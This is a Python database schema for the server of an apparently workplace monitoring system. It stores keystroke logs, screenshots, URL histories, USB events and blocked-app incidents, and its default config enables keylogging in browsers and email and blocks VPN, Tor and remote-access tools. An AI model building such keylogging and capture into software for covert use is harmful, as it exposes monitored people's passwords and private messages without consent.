# server/database.py
from datetime import datetime
from sqlalchemy import (create_engine, Column, Integer, String, Text,
                        Boolean, DateTime, LargeBinary, Index)
from sqlalchemy.orm import declarative_base, sessionmaker, Session
import config

engine       = create_engine(config.DATABASE_URL,
               connect_args={"check_same_thread": False} if "sqlite" in config.DATABASE_URL else {})
SessionLocal = sessionmaker(bind=engine, autoflush=False, autocommit=False)
Base         = declarative_base()


class Machine(Base):
    __tablename__ = "machines"
    id         = Column(Integer, primary_key=True)
    name       = Column(String(128), unique=True, nullable=False)
    api_key    = Column(String(64),  unique=True, nullable=False)
    active     = Column(Boolean, default=True)
    first_seen = Column(DateTime, default=datetime.utcnow)
    last_seen  = Column(DateTime, default=datetime.utcnow)
    notes      = Column(Text, default="")


class MachineConfig(Base):
    """Stores per-machine (or default) remote configuration as JSON."""
    __tablename__ = "machine_configs"
    id         = Column(Integer, primary_key=True)
    machine    = Column(String(128), nullable=False, unique=True)
    # machine = "__default__" for the baseline all machines inherit
    config_json = Column(Text, nullable=False, default="{}")
    version    = Column(Integer, default=1)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)


class ActivityEvent(Base):
    __tablename__ = "activity_events"
    id           = Column(Integer, primary_key=True)
    machine      = Column(String(128), nullable=False, index=True)
    app          = Column(String(256))
    exe          = Column(String(512))
    window_title = Column(Text)
    start_utc    = Column(DateTime, index=True)
    end_utc      = Column(DateTime)
    idle         = Column(Boolean, default=False)
    ingested_at  = Column(DateTime, default=datetime.utcnow)
    __table_args__ = (Index("idx_act_ms", "machine", "start_utc"),)


class UrlVisit(Base):
    __tablename__ = "url_visits"
    id          = Column(Integer, primary_key=True)
    machine     = Column(String(128), nullable=False, index=True)
    browser     = Column(String(32))
    url         = Column(Text)
    title       = Column(Text)
    visited_utc = Column(DateTime, index=True)
    ingested_at = Column(DateTime, default=datetime.utcnow)


class Screenshot(Base):
    __tablename__ = "screenshots"
    id           = Column(Integer, primary_key=True)
    machine      = Column(String(128), nullable=False, index=True)
    filename     = Column(String(256))
    captured_utc = Column(DateTime, index=True)
    reason       = Column(String(32))
    image_data   = Column(LargeBinary)
    ingested_at  = Column(DateTime, default=datetime.utcnow)


class AppViolation(Base):
    __tablename__ = "app_violations"
    id           = Column(Integer, primary_key=True)
    machine      = Column(String(128), nullable=False, index=True)
    app_name     = Column(String(256))
    exe_path     = Column(Text)
    username     = Column(String(128))
    pid          = Column(Integer)
    killed       = Column(Boolean)
    detected_utc = Column(DateTime, index=True)
    severity     = Column(String(16))
    acknowledged = Column(Boolean, default=False)
    ingested_at  = Column(DateTime, default=datetime.utcnow)


class UsbEvent(Base):
    __tablename__ = "usb_events"
    id            = Column(Integer, primary_key=True)
    machine       = Column(String(128), nullable=False, index=True)
    drive_letter  = Column(String(4))
    volume_serial = Column(String(64))
    device_serial = Column(String(128))
    whitelisted   = Column(Boolean)
    action        = Column(String(32))
    detected_utc  = Column(DateTime, index=True)
    severity      = Column(String(16))
    acknowledged  = Column(Boolean, default=False)
    ingested_at   = Column(DateTime, default=datetime.utcnow)


class KeylogSession(Base):
    __tablename__ = "keylog_sessions"
    id         = Column(Integer, primary_key=True)
    machine    = Column(String(128), nullable=False, index=True)
    app        = Column(String(256))
    text_enc   = Column(Text)
    start_utc  = Column(DateTime, index=True)
    end_utc    = Column(DateTime)
    ingested_at = Column(DateTime, default=datetime.utcnow)


class Alert(Base):
    __tablename__ = "alerts"
    id           = Column(Integer, primary_key=True)
    machine      = Column(String(128), nullable=False, index=True)
    severity     = Column(String(16))
    category     = Column(String(32))
    message      = Column(Text)
    ref_table    = Column(String(64))
    ref_id       = Column(Integer)
    acknowledged = Column(Boolean, default=False)
    created_at   = Column(DateTime, default=datetime.utcnow)


def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


def init_db():
    Base.metadata.create_all(bind=engine)
    # Create default config if not exists
    db = SessionLocal()
    if not db.query(MachineConfig).filter_by(machine="__default__").first():
        import json
        default_cfg = {
            "SCREENSHOT_INTERVAL": 180,
            "SCREENSHOT_QUALITY":  60,
            "SCREENSHOT_ON_SWITCH": True,
            "UPLOAD_EVERY":        3600,
            "CONFIG_SYNC_EVERY":   900,
            "USB_BLOCK_MODE":      "alert",
            "USB_WHITELIST_SERIALS": [],
            "KEYLOG_ENABLED":      True,
            "KEYLOG_APPS": ["chrome.exe","msedge.exe","firefox.exe","outlook.exe","code.exe"],
            "APP_BLACKLIST": [
                "obs64.exe","obs32.exe","sharex.exe","snagit32.exe","camtasia.exe",
                "filezilla.exe","winscp.exe","utorrent.exe","bittorrent.exe","qbittorrent.exe",
                "whatsapp.exe","telegram.exe","discord.exe",
                "nordvpn.exe","expressvpn.exe","protonvpn.exe","psiphon.exe",
                "dropbox.exe","teamviewer.exe","anydesk.exe","tor.exe",
            ],
            "WEBSITE_BLOCKLIST": [
                "facebook.com","www.facebook.com","instagram.com","www.instagram.com",
                "tiktok.com","twitter.com","x.com","snapchat.com",
                "mail.google.com","gmail.com","mail.yahoo.com","outlook.live.com","protonmail.com",
                "drive.google.com","dropbox.com","wetransfer.com","mega.nz",
                "web.whatsapp.com","web.telegram.org","discord.com",
                "netflix.com","hotstar.com","twitch.tv",
                "hidemyass.com","hide.me","proxysite.com",
            ],
            "version": 1,
        }
        db.add(MachineConfig(machine="__default__", config_json=json.dumps(default_cfg), version=1))
        db.commit()
    db.close()
    print(f"Database initialised: {config.DATABASE_URL}")
